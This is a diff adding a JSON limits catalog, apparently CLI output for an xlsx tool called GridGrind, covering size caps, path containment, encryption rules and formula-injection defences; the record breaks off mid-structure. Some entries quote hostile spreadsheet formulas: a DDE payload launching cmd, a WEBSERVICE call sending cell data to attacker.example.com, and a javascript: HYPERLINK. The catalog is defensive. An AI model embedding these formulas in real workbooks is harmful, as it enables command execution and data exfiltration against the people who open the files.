@@ -1,0 +1,987 @@
+{
+  "exit" : 0,
+  "stderr" : "",
+  "stdout" : {
+    "discriminatorField" : "type",
+    "fieldMetadataKeys" : [ {
+      "meaning" : "Field omission resolves to this constant JSON value.",
+      "name" : "defaultValue"
+    }, {
+      "meaning" : "Field omission copies the named sibling component's value.",
+      "name" : "defaultFrom"
+    }, {
+      "meaning" : "Field is present only when one of the listed read-projection facets is requested.",
+      "name" : "projectedByFacets"
+    }, {
+      "meaning" : "Entry references stable note ids published once in the scoped lookup payload or full catalog.",
+      "name" : "noteRefs"
+    }, {
+      "meaning" : "Field publishes per-enum-value summaries aligned with enumValues so agents can choose the right token directly.",
+      "name" : "enumValueDocs"
+    } ],
+    "limits" : [ {
+      "appliesTo" : [ "GET_CELLS", "GET_WINDOW", "GET_SHEET_SCHEMA" ],
+      "category" : "GridGrind",
+      "id" : "LIM-001",
+      "messageTemplate" : "`addresses must not exceed 250000 but was {n}` / `rowCount * columnCount must not exceed 250000 but was {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Excel allows worksheets with up to 1,048,576 rows and 16,384 columns. POI can read arbitrarily\nlarge windows and exact address lists; GridGrind must then materialize and serialize factual cell\npayloads. Sparse `GET_WINDOW` readback reduces blank-heavy payloads, but it does not change the\nworst case: a dense 50,000-cell window still returns 50,000 factual cells, `GET_SHEET_SCHEMA`\nstill examines the entire rectangular sample even when many cells are blank, and an oversized\n`GET_CELLS` address list still asks GridGrind to return one factual cell report per address. The\n250,000-cell cap keeps the request gate deterministic before workbook IO and prevents\n`OutOfMemoryError`, empty response files, and unstructured exit-code-1 failures on worst-case\ncell-returning reads.\n\nThis limit is not from Apache POI or Excel. A serialized-byte cap depends on workbook contents and is only knowable after reading the\nworkbook. The deterministic cell-count cap bounds materialization before workbook IO.\n\n**Recommended pattern for large sheets:** Use `GET_SHEET_SUMMARY` to discover `lastRowIndex` and\n`lastColumnIndex`, then either chunk exact `GET_CELLS` address lists or tile the populated region\nwith multiple bounded `GET_WINDOW` reads.",
+      "title" : "Cell-Returning Read Count",
+      "value" : "250000 cells"
+    }, {
+      "appliesTo" : [ "source", "persistence" ],
+      "category" : "GridGrind",
+      "id" : "LIM-002",
+      "messageTemplate" : "`path must point to a .xlsx workbook; .xls, .xlsm, and .xlsb are not supported: {path}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "GridGrind intentionally narrows Apache POI's broader OOXML workbook support to plain `.xlsx`.\n`.xls` (BIFF8/HSSF), macro-enabled `.xlsm`, and `.xlsb` (binary) are all rejected by the product\ncontract even though Apache POI can preserve and extract VBA-bearing `.xlsm` packages.",
+      "title" : "File Format",
+      "value" : ".xlsx"
+    }, {
+      "appliesTo" : [ "sheetName" ],
+      "category" : "GridGrind (enforces Excel limit)",
+      "id" : "LIM-003",
+      "messageTemplate" : "`sheetName must not exceed 31 characters: {name}` or `sheetName contains invalid Excel character ':' at position 4: Bad:Name`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "The 31-character ceiling and reserved-character rules are Excel hard limits. GridGrind validates\nthem at request parse time so the error is structured and reported before any workbook work\nbegins, instead of surfacing a raw Apache POI sheet-creation exception later in execution.",
+      "title" : "Sheet Name Contract",
+      "value" : "1..31 characters, with Excel sheet-name syntax"
+    }, {
+      "appliesTo" : [ "SET_COLUMN_WIDTH", "SET_SHEET_PRESENTATION.sheetDefaults.defaultColumnWidth" ],
+      "category" : "GridGrind (enforces Excel limit)",
+      "id" : "LIM-004",
+      "messageTemplate" : "`widthCharacters must not exceed 255.0 (Excel column width limit): got {n}` / `widthCharacters is too small to produce a visible Excel column width: got {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "255 character units is the Excel column width ceiling. POI converts explicit column widths to\ninternal units with `round(widthCharacters * 256)`. Values that round to zero are also rejected.\nSheet-wide default column widths are integer character counts and use the same Excel ceiling.\n`GET_SHEET_LAYOUT` remains factual on reopen, so malformed positive persisted explicit column\nwidths can still be reported above `255` instead of being clamped.",
+      "title" : "Column Width",
+      "value" : "0 < width <= 255.0"
+    }, {
+      "appliesTo" : [ "SET_ROW_HEIGHT", "SET_SHEET_PRESENTATION.sheetDefaults.defaultRowHeightPoints" ],
+      "category" : "GridGrind (enforces Excel limit)",
+      "id" : "LIM-005",
+      "messageTemplate" : "`heightPoints must not exceed 409.0 (Excel row height limit): got {n}` / `heightPoints is too small to produce a visible Excel row height: {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Excel's published maximum row height is 409 points for `.xlsx` worksheets. Apache POI can store a\nlarger twip value internally, but GridGrind aligns the product contract to the real Excel limit\ninstead of the wider storage envelope. Values that round to zero twips are also rejected.\n`GET_SHEET_LAYOUT` remains factual on reopen, so malformed positive persisted explicit row heights\nand default row-height values can still be reported above `409.0` instead of being clamped.",
+      "title" : "Row Height",
+      "value" : "0 < height <= 409.0 points"
+    }, {
+      "appliesTo" : [ "steps" ],
+      "category" : "GridGrind",
+      "id" : "LIM-006",
+      "messageTemplate" : "`steps must not contain duplicate stepId values: {id}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Step identity must remain unambiguous in ordered execution, diagnostics and evidence.",
+      "title" : "Duplicate Step IDs",
+      "value" : "`stepId` values in the `steps` array must be unique"
+    }, {
+      "appliesTo" : [ "steps[*].stepId" ],
+      "category" : "GridGrind",
+      "id" : "LIM-006A",
+      "messageTemplate" : "`stepId must match [A-Za-z0-9._-]+`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Stable machine-readable step tokens avoid ambiguous diagnostic paths and lookup identities.",
+      "title" : "Step ID Token Shape",
+      "value" : "[A-Za-z0-9._-]+"
+    }, {
+      "appliesTo" : [ "GET_CELLS" ],
+      "category" : "GridGrind",
+      "id" : "LIM-007",
+      "messageTemplate" : "`addresses must not be empty` / `addresses must not contain duplicates`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "A nonempty distinct address list defines one factual result per requested coordinate.",
+      "title" : "GET_CELLS Address List",
+      "value" : "`addresses` must be non-empty and contain no duplicates"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "GridGrind (enforces Excel limit for addressed row indices and bands)",
+      "id" : "LIM-008",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "Last valid zero-based row index: 1,048,575.\n\nGridGrind already rejects out-of-bounds addressed rows on the public request path for selectors,\nrow-band operations, row-structural edits, and print-title row bands instead of deferring those\nerrors to Apache POI.",
+      "title" : "Maximum Rows per Worksheet",
+      "value" : "1048576 rows"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "GridGrind (enforces Excel limit for addressed column indices and bands)",
+      "id" : "LIM-009",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "Last valid zero-based column index: 16,383.\n\nGridGrind already rejects out-of-bounds addressed columns on the public request path for\nselectors, column-band operations, column-structural edits, and print-title column bands.",
+      "title" : "Maximum Columns per Worksheet",
+      "value" : "16384 columns"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "Excel/POI",
+      "id" : "LIM-010",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "This is the persisted Excel cell-text ceiling; reject oversized authored or reconstructed text before native mutation.",
+      "title" : "Maximum Text Characters per Cell",
+      "value" : "32767 characters"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "Excel/POI",
+      "id" : "LIM-011",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "Note: POI's cap (64,000) is more conservative than Excel's (65,490). The POI figure is the\neffective limit when writing via GridGrind.",
+      "title" : "Maximum Cell Styles per Workbook",
+      "value" : "64000 styles (POI ceiling)"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "Excel format",
+      "id" : "LIM-012",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "This bounds worksheet hyperlink records before appending a new native link relationship.",
+      "title" : "Maximum Hyperlinks per Worksheet",
+      "value" : "65530 hyperlinks"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "Excel format",
+      "id" : "LIM-013",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "Authored formulas are checked before native parse/persistence so oversized text fails predictably.",
+      "title" : "Maximum Formula Length",
+      "value" : "8192 characters"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "Excel format",
+      "id" : "LIM-014",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "Formula shape is bounded before native parsing to retain the workbook format and parser depth contract.",
+      "title" : "Maximum Nested Function Levels",
+      "value" : "64"
+    }, {
+      "appliesTo" : [ ],
+      "category" : "Excel/POI",
+      "id" : "LIM-015",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "Function argument counts are checked against the pinned Excel 2007 workbook version before persistence.",
+      "title" : "Maximum Function Arguments",
+      "value" : "255"
+    }, {
+      "appliesTo" : [ "INSERT_ROWS", "DELETE_ROWS", "SHIFT_ROWS", "INSERT_COLUMNS", "DELETE_COLUMNS", "SHIFT_COLUMNS" ],
+      "category" : "GridGrind",
+      "id" : "LIM-016",
+      "messageTemplate" : "Product-owned `INSERT_ROWS`, `DELETE_ROWS`, `SHIFT_ROWS`, `INSERT_COLUMNS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` message naming the affected structure and sheet",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Apache POI 5.5.1 does not reliably normalize table refs or sheet autofilter refs when rows or\ncolumns are structurally inserted, deleted, or shifted, and it still leaves data-validation\ncoverage unsafe for delete and shift flows. GridGrind now rebuilds data validations across row and\ncolumn inserts, but it still rejects the remaining unsafe structural edits instead of persisting\nstale workbook XML or silently moving only part of the owned structure.\n\nThe rejection is precise and structure-owned. Example messages include:\n- `INSERT_ROWS cannot move table 'BudgetTable' on sheet 'Budget'; row structural edits that would move tables are not supported`\n- `DELETE_COLUMNS cannot move sheet autofilter A1:C10 on sheet 'Budget'; column structural edits that would move or truncate sheet autofilters are not supported`",
+      "title" : "Structural Edits That Would Move Unsupported Owned Structures",
+      "value" : "Structural inserts are rejected when they would move a table or sheet-owned autofilter; structural deletes and shifts are also rejected when they would move or truncate a data validation"
+    }, {
+      "appliesTo" : [ "INSERT_COLUMNS", "DELETE_COLUMNS", "SHIFT_COLUMNS" ],
+      "category" : "GridGrind",
+      "id" : "LIM-017",
+      "messageTemplate" : "`INSERT_COLUMNS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` product-owned message explaining that Apache POI leaves some column references stale",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Apache POI 5.5.1 updates some column references during `shiftColumns(...)`, but not all of them.\nIn direct probes against formula-bearing workbooks, formulas such as `A2&B2` were rewritten while\nothers such as `SUM(B2:B4)` remained stale after the same column move. Formula-defined names have\nthe same risk surface. GridGrind therefore rejects column structural edits whenever formulas or\nformula-defined names are present instead of persisting mixed-reference drift.\n\nExample message:\n- `SHIFT_COLUMNS cannot run while workbook formulas are present; Apache POI leaves some column references stale during column structural edits`",
+      "title" : "Column Structural Edits While Formulas Are Present",
+      "value" : "Column structural edits are rejected when the workbook contains any formula cells or formula-defined named ranges"
+    }, {
+      "appliesTo" : [ "DELETE_ROWS", "SHIFT_ROWS", "DELETE_COLUMNS", "SHIFT_COLUMNS" ],
+      "category" : "GridGrind",
+      "id" : "LIM-018",
+      "messageTemplate" : "Product-owned `DELETE_ROWS`, `SHIFT_ROWS`, `DELETE_COLUMNS`, or `SHIFT_COLUMNS` message naming the affected named range and sheet",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Apache POI can safely translate a range-backed named range when the named range is fully contained\ninside the moved row or column band, or when it is completely untouched by the edit. Direct probes\nagainst `deleteRows(...)`, `shiftRows(...)`, `deleteColumns(...)`, and `shiftColumns(...)` showed\nthat destructive overlap produces broken formulas such as `I!#REF!:I!#REF!` and\n`I!#REF!:I!$B$1`. GridGrind therefore rejects only the destructive cases instead of persisting\ninvalid named-range formulas that can later crash workbook rewrites.\n\nExample messages:\n- `DELETE_ROWS cannot move named range 'BudgetWindow' on sheet 'Budget'; row structural edits that would truncate range-backed named ranges are not supported`\n- `SHIFT_COLUMNS cannot move named range 'BudgetWindow' on sheet 'Budget'; column structural edits that would overwrite or partially move range-backed named ranges are not supported`",
+      "title" : "Destructive Structural Edits Against Range-Backed Named Ranges",
+      "value" : "`DELETE_ROWS`, `SHIFT_ROWS`, `DELETE_COLUMNS`, and `SHIFT_COLUMNS` are rejected when they would truncate a range-backed named range or partially move / overwrite one outside the moved band"
+    }, {
+      "appliesTo" : [ "execution.mode.type", "steps[]" ],
+      "category" : "GridGrind",
+      "id" : "LIM-019",
+      "messageTemplate" : "`execution.mode.type=EVENT_READ supports inspection steps only; unsupported step kind: {kind}`, `execution.mode.type=EVENT_READ does not support assertion steps`, or `execution.mode.type=EVENT_READ supports GET_WORKBOOK_SUMMARY and GET_SHEET_SUMMARY only; unsupported read type: {type}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "`EVENT_READ` is the low-memory summary reader backed by POI's XSSF event model. It does not\nmaterialize the full workbook object graph, so GridGrind restricts it to workbook and sheet\nsummary reads only. Unsupported factual reads and analysis reads are rejected at request-validation\ntime instead of silently falling back to the normal in-memory executor.",
+      "title" : "Event-Read Execution Mode Scope",
+      "value" : "`execution.mode.type=EVENT_READ` supports only inspection steps, and only `GET_WORKBOOK_SUMMARY` plus `GET_SHEET_SUMMARY` queries"
+    }, {
+      "appliesTo" : [ "execution.mode.type", "source", "steps[]" ],
+      "category" : "GridGrind",
+      "id" : "LIM-020",
+      "messageTemplate" : "`execution.mode.type=STREAMING_WRITE requires source.type=NEW ...`, `execution.mode.type=STREAMING_WRITE supports ENSURE_SHEET and APPEND_ROW only; unsupported mutation action type: {type}`, `execution.mode.type=STREAMING_WRITE requires execution.calculation.strategy=DO_NOT_CALCULATE ...`, `execution.mode.type=STREAMING_WRITE allows execution.calculation.markRecalculateOnOpen=true only when strategy=DO_NOT_CALCULATE ...`, `execution.mode.type=STREAMING_WRITE requires ENSURE_SHEET before any assertion step ...`, `execution.mode.type=STREAMING_WRITE requires ENSURE_SHEET before any inspection step ...`, or `execution.mode.type=STREAMING_WRITE requires at least one ENSURE_SHEET mutation ...`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "`STREAMING_WRITE` is the low-memory append-oriented writer backed by POI `SXSSF`. It authors only\nnew workbooks and does not expose the full XSSF mutation surface. GridGrind validates the reduced\noperation contract up front so callers get deterministic structured errors instead of half-written\nstreaming workbooks or hidden mode fallback.",
+      "title" : "Streaming-Write Execution Mode Scope",
+      "value" : "`execution.mode.type=STREAMING_WRITE` requires `source.type=NEW`, limits mutation actions to `ENSURE_SHEET` and `APPEND_ROW`, requires `execution.calculation.strategy=DO_NOT_CALCULATE`, allows `markRecalculateOnOpen=true`, requires `ENSURE_SHEET` before any append/assertion/inspection work, and requires at least one `ENSURE_SHEET` mutation"
+    }, {
+      "appliesTo" : [ "--request <path>", "GridGrindJson.readRequest(InputStream)", "GridGrindJson.readRequest(byte[])" ],
+      "category" : "GridGrind",
+      "id" : "LIM-021",
+      "messageTemplate" : "`Request JSON exceeds the maximum size of 16 MiB (16777216 bytes); move large authored payloads into UTF8_FILE, FILE, or STANDARD_INPUT sources.`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "GridGrind accepts large authored values through source-backed inputs (`UTF8_FILE`, `FILE`, and\n`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI now\nrejects oversized request files before execution starts, and the JSON codec enforces the same\ndocument cap on stdin and byte-array entry points so every transport path fails with one stable\nproduct-owned `INVALID_REQUEST` message.",
+      "title" : "Request JSON Size",
+      "value" : "16777216 bytes"
+    }, {
+      "appliesTo" : [ "SET_SHEET_ZOOM" ],
+      "category" : "GridGrind (enforces Excel limit)",
+      "id" : "LIM-022",
+      "messageTemplate" : "`zoomPercent must be between 10 and 400 inclusive: {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Excel exposes worksheet zoom in the 10% to 400% range. GridGrind validates the authored value up\nfront and reuses the same bound for factual sheet-layout reports so CLI operators and agents see\none stable limit across mutation, help, catalog, and readback surfaces.",
+      "title" : "Sheet Zoom Percentage",
+      "value" : "10..400 percent"
+    }, {
+      "appliesTo" : [ "CellValueSpec.Formula", "INLINE" ],
+      "category" : "GridGrind",
+      "id" : "LIM-023",
+      "messageTemplate" : "`source must not use the DDE function; DDE formula execution is a security risk`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Dynamic Data Exchange (DDE) formulas such as `DDE(\"cmd\", \"/C calc\", \"\")` can invoke external\nprograms when the saved workbook is opened in Microsoft Excel on Windows. GridGrind rejects inline\nformula sources that begin with `DDE(` (case-insensitive) after stripping the leading `=`.\nFile-backed formula sources are not validated at construction time but are equally subject to this\nconstraint in execution.",
+      "title" : "DDE Formula Injection",
+      "value" : "`CellValueSpec.Formula` must not use the Excel DDE function"
+    }, {
+      "appliesTo" : [ "steps" ],
+      "category" : "GridGrind",
+      "id" : "LIM-024",
+      "messageTemplate" : "`steps must not exceed 10000 entries but was {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Unbounded step lists enable runaway resource consumption and extended execution times. The 10,000-\nstep ceiling is generous enough for legitimate bulk streaming-write workflows (for example, 10,000\n`APPEND_ROW` mutations) while preventing pathological inputs. The separate 16 MiB JSON cap\n(`LIM-021`) further bounds the total request size independent of step count.",
+      "title" : "Step Count",
+      "value" : "10000 steps"
+    }, {
+      "appliesTo" : [ "Workbook source and persistence paths, formula external workbooks, signing material, and file-backed authored inputs" ],
+      "category" : "GridGrind",
+      "id" : "LIM-025",
+      "messageTemplate" : "`path must not escape the execution root: {path}`",
+      "problemCodes" : [ "PATH_ESCAPES_ROOT" ],
+      "rationale" : "GridGrind normalizes every request-owned path against the execution root before it opens or writes\nanything. A relative traversal such as `../secret.xlsx` and an absolute path outside the root fail\nwith the same code. A contained absolute path remains legal but carries a warning because it relies\non one host-specific root layout. CLI flag paths are invocation controls, not request-owned paths.",
+      "title" : "Request-Owned Path Containment",
+      "value" : "Every request-owned path, whether relative or absolute, must resolve beneath the execution root"
+    }, {
+      "appliesTo" : [ "All xlsx workbook open operations" ],
+      "category" : "GridGrind",
+      "id" : "LIM-026",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "GridGrind explicitly configures Apache POI's `ZipSecureFile` limits to bound decompression memory\nand time during xlsx package open. An entry expanding beyond 100 MiB or achieving a compression\nratio beyond 1:100 triggers a `ZipBombException`, which GridGrind translates to an\n`INVALID_REQUEST` failure rather than an `OutOfMemoryError` or indefinite CPU consumption.",
+      "title" : "ZIP Decompression Limits",
+      "value" : "104857600 decompressed bytes per entry; minimum inflate ratio 0.01"
+    }, {
+      "appliesTo" : [ "ArrayFormulaSpec", "DataValidationRuleSpec", "ConditionalFormattingRuleSpec", "ConditionalFormattingThresholdSpec.Formula", "ChartDataSourceSpec.Reference.formula" ],
+      "category" : "GridGrind",
+      "id" : "LIM-027",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "GridGrind rejects any formula string that begins with `DDE(` (case-insensitive, stripping leading\n`=` or `{=...}` prefixes first) across all formula-bearing input types. The DDE (Dynamic Data\nExchange) function is a Windows IPC mechanism; embedding it in an xlsx workbook can trigger\narbitrary command execution when the file is opened in Microsoft Excel. This guard extends the\n`CellValueSpec.Formula` protection (LIM-023) to every remaining formula surface written to xlsx output.",
+      "title" : "DDE Rejection in All Formula Inputs",
+      "value" : "DDE function forbidden in all formula-bearing inputs"
+    }, {
+      "appliesTo" : [ "HyperlinkTarget.Url" ],
+      "category" : "GridGrind",
+      "id" : "LIM-028",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "GridGrind enforces an explicit allowlist of URL schemes for `HyperlinkTarget.Url` targets.\nSchemes such as `javascript:`, `vbscript:`, `ms-excel:`, `ldap:`, and `data:` are rejected.\nThese schemes can trigger script execution, protocol-handler abuse, or cross-site scripting when\nthe hyperlink is activated in a browser-based spreadsheet viewer or other host application.",
+      "title" : "URL Scheme Allowlist",
+      "value" : "Only `http`, `https`, `ftp`, and `ftps` schemes accepted for URL hyperlinks"
+    }, {
+      "appliesTo" : [ "Workbook source and persistence paths, formula external workbooks, signing material, and file-backed authored inputs" ],
+      "category" : "GridGrind",
+      "id" : "LIM-029",
+      "messageTemplate" : "",
+      "problemCodes" : [ "UNSAFE_PATH_ACCESS" ],
+      "rationale" : "GridGrind binds the root and every existing parent with no-follow directory descriptors, records\ntheir filesystem identities, copies request inputs into private staging, and commits output through\nthe retained parent descriptor. Any symlink is rejected, including a link that happens to point\ninside the root. Immediately before persistence, GridGrind rechecks the recorded topology and\nfails closed if it observes a replacement, unlink, rename, or symlink transition.\n\nThis protects containment while the bound filesystem topology remains stable. It does not claim\nabsolute containment against a principal that can mutate that topology in the scheduling window\nbetween the final identity recheck and a descriptor-relative commit; Java exposes no proven,\nportable root-anchored atomic-resolve-and-commit primitive for that stronger guarantee.",
+      "title" : "No-Follow Request Path Binding",
+      "value" : "Request-owned reads and writes never follow a symbolic link and use descriptor-relative access below a verified execution root"
+    }, {
+      "appliesTo" : [ "TextSourceSpec.Utf8File", "BinarySourceSpec.File" ],
+      "category" : "GridGrind",
+      "id" : "LIM-030",
+      "messageTemplate" : "",
+      "problemCodes" : [ "PATH_ESCAPES_ROOT", "UNSAFE_PATH_ACCESS", "INPUT_SOURCE_NOT_FOUND", "INPUT_SOURCE_IO_ERROR" ],
+      "rationale" : "The resolver reads each authored file through the same containment and no-follow capability used\nfor workbooks and signing material, then normalizes its bytes into the in-memory plan. The later\nmutation phase never reopens an authored path string, so a source-file race cannot redirect the\ncontent that was validated during preflight.",
+      "title" : "File-Backed Authored Input Isolation",
+      "value" : "File-backed text and binary authored inputs are read only through the request-owned no-follow binding and are resolved before workbook mutation"
+    }, {
+      "appliesTo" : [ "FormulaInputSecurity.rejectDde" ],
+      "category" : "GridGrind",
+      "id" : "LIM-031",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Excel's `WEBSERVICE` function sends an outbound HTTP GET request when the workbook is opened and\nformulas are evaluated, making it a data-exfiltration vector. A formula such as\n`=WEBSERVICE(\"https://attacker.example.com/collect?d=\"&ENCODEURL(A1))` causes the downstream\nExcel client to send cell data to an attacker-controlled server without any user interaction.\n`FormulaInputSecurity.rejectDde` now also rejects formulas beginning with `WEBSERVICE(`\n(case-insensitive) after stripping any leading `=` or `{=…}` array-formula delimiters.",
+      "title" : "WEBSERVICE Formula Rejection",
+      "value" : "Formula inputs must not use the `WEBSERVICE` function"
+    }, {
+      "appliesTo" : [ "NamedRangeTarget.Formula" ],
+      "category" : "GridGrind",
+      "id" : "LIM-032",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Named-range formulas are written into the xlsx defined-names part and evaluated automatically by\nExcel when the workbook is opened or any formula references the named range. A `NamedRangeTarget`\nwith `kind: FORMULA` and a payload such as `DDE(\"cmd\",\"/C calc\",\"\")` or\n`WEBSERVICE(\"https://attacker.example.com/\")` would execute without any user interaction.\n`NamedRangeTarget.Formula` now calls `FormulaInputSecurity.rejectDde` in its compact constructor.",
+      "title" : "Named-Range Formula Injection",
+      "value" : "Named-range formula targets must not use the `DDE` or `WEBSERVICE` functions"
+    }, {
+      "appliesTo" : [ "ChartTitleSpec.Formula" ],
+      "category" : "GridGrind",
+      "id" : "LIM-033",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Chart title formulas are stored in the chart XML and auto-evaluated when Excel renders the chart\non workbook open. A `ChartTitleSpec` with `type: FORMULA` and a DDE or WEBSERVICE payload executes\nwithout user interaction. `ChartTitleSpec.Formula` now calls `FormulaInputSecurity.rejectDde`.",
+      "title" : "Chart Title Formula Injection",
+      "value" : "Chart title formula inputs must not use the `DDE` or `WEBSERVICE` functions"
+    }, {
+      "appliesTo" : [ "FormulaUdfFunctionSpec.formulaTemplate" ],
+      "category" : "GridGrind",
+      "id" : "LIM-034",
+      "messageTemplate" : "",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "UDF formula templates are evaluated server-side only by Apache POI, which does not implement DDE\nor WEBSERVICE and would return an evaluation error for those functions. Templates are also never\nwritten to xlsx output — only the UDF call site (e.g., `MY_FUNC(arg)`) appears in the file.\nThe guard is applied as defense-in-depth against future POI changes or alternative evaluation paths.",
+      "title" : "UDF Formula Template Injection (Defense-in-Depth)",
+      "value" : "UDF formula templates must not use the `DDE` or `WEBSERVICE` functions"
+    }, {
+      "appliesTo" : [ "CellValueSpec.Formula", "NamedRangeTarget.Formula", "ChartTitleSpec.Formula" ],
+      "category" : "GridGrind (accepted limitation)",
+      "id" : "LIM-035",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "The URL scheme allowlist in LIM-028 applies to `HyperlinkInput`, not to formula-embedded\nhyperlinks. A formula such as `=HYPERLINK(\"javascript:evil()\")` passes `FormulaInputSecurity.rejectDde`\nand is written to the xlsx file. The risk delta versus LIM-028 is limited: `HYPERLINK()` requires a\nuser click to navigate and is not auto-evaluated on workbook open. The `DDE(` and `WEBSERVICE(` patterns\nthat execute automatically are already blocked. Closing this gap fully would require an embedded\nformula parser; the accepted residual risk is click-triggered URI navigation only.",
+      "title" : "HYPERLINK() Formula Content Not Validated Against URL Allowlist",
+      "value" : "`HYPERLINK()` payloads inside formula strings are not inspected for URL scheme"
+    }, {
+      "appliesTo" : [ "all formula inputs" ],
+      "category" : "GridGrind (accepted limitation)",
+      "id" : "LIM-036",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "`RTD()` connects to a registered Windows COM automation server when the workbook is opened on\nWindows. `FormulaInputSecurity.rejectDde` does not block `RTD()`. The risk is platform-scoped:\n`RTD()` is a no-op on macOS and Linux, and on Windows it requires a pre-registered COM server on\nthe consuming workstation. GridGrind targets server-side xlsx generation workloads where COM\ninfrastructure is absent. Blocking `RTD()` would require a formula parser; the accepted risk is\nWindows-only and depends on attacker-controlled COM registration on the target machine.",
+      "title" : "RTD() Function Not Blocked",
+      "value" : "`RTD()` (Real-Time Data) in formula strings is not blocked"
+    }, {
+      "appliesTo" : [ "source", "EXISTING" ],
+      "category" : "GridGrind",
+      "id" : "LIM-037",
+      "messageTemplate" : "Only .xlsx workbooks are supported",
+      "problemCodes" : [ "WORKBOOK_NOT_OPENABLE" ],
+      "rationale" : "The materialized reader constructs XSSFWorkbook rather than the general WorkbookFactory. A native HSSF-written control renamed to .xlsx is rejected, while an OOXML control reopens. ",
+      "title" : "Workbook Source Content Format",
+      "value" : "Binary XLS content is rejected even when its filename ends in .xlsx"
+    }, {
+      "appliesTo" : [ "persistence.security.encryption" ],
+      "category" : "Protocol",
+      "id" : "LIM-038",
+      "messageTemplate" : "",
+      "problemCodes" : [ ],
+      "rationale" : "GridGrind reads and reports broader factual OOXML encryption state than it authors. Inspection may\nsurface legacy envelopes such as `STANDARD`, weaker AGILE variants, or non-default hashes because\nthe goal on the read path is factual reporting. The write path is intentionally narrower:\nauthorable persistence security owns one explicit strong-only AGILE contract and does not accept a\n`mode` field. Existing-workbook writes declare encryption explicitly: `NONE`, `ENCRYPT`, or\n`PRESERVE_SOURCE`; omission never inherits source encryption. `PRESERVE_SOURCE` applies only to a\nverified source envelope that the strong AGILE write contract can reapply. Readable/reportable `STANDARD` envelopes are outside the authorable strong-only AGILE write\ncontract.",
+      "title" : "OOXML Write Encryption Is AGILE-Only And Strong-Only",
+      "value" : "Write-side OOXML package encryption authors AGILE only, defaults to `AES_256` / `SHA_512`, and allows only `AES_256` or `AES_192` plus `SHA_512`, `SHA_384`, or `SHA_256`"
+    }, {
+      "appliesTo" : [ "APPLY_STYLE", "CLEAR_RANGE", "SET_ARRAY_FORMULA", "SET_RANGE", "SET_ROW_HEIGHT", "SET_ROW_VISIBILITY", "GROUP_ROWS", "UNGROUP_ROWS" ],
+      "category" : "GridGrind",
+      "id" : "LIM-039",
+      "messageTemplate" : "`materialized worksheet work must not exceed 250000 items per plan; this step raises the total to {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "GridGrind counts every action that must enumerate cells or create physical rows before the workbook\nis opened. The cumulative limit prevents a syntactically valid plan from exhausting the JVM by\nmaterializing an Excel-sized range or row band, including when equivalent work is spread across\nseveral steps.",
+      "title" : "Materialized Worksheet Work per Plan",
+      "value" : "250000 materialized worksheet items per plan"
+    }, {
+      "appliesTo" : [ "EXPLICIT_LIST" ],
+      "category" : "Excel / GridGrind",
+      "id" : "LIM-040",
+      "messageTemplate" : "`values must serialize to at most 255 characters for Excel data validation; got {n}`",
+      "problemCodes" : [ "INVALID_REQUEST" ],
+      "rationale" : "Excel data-validation explicit lists are stored as one quoted comma-separated formula. GridGrind\nrejects commas and quotes inside individual values because that representation cannot preserve them;\nuse `FORMULA_LIST` when values require delimiters. It validates the complete stored formula before\nApache POI authoring so callers receive the request path and computed length instead of a library\nexception.",
+      "title" : "Explicit Data-Validation List Formula Length",
+      "value" : "255 characters in the stored explicit-list formula"
+    } ],
+    "lookupNamespaces" : [ {
+      "shape" : "<topLevelGroup>:<id>",
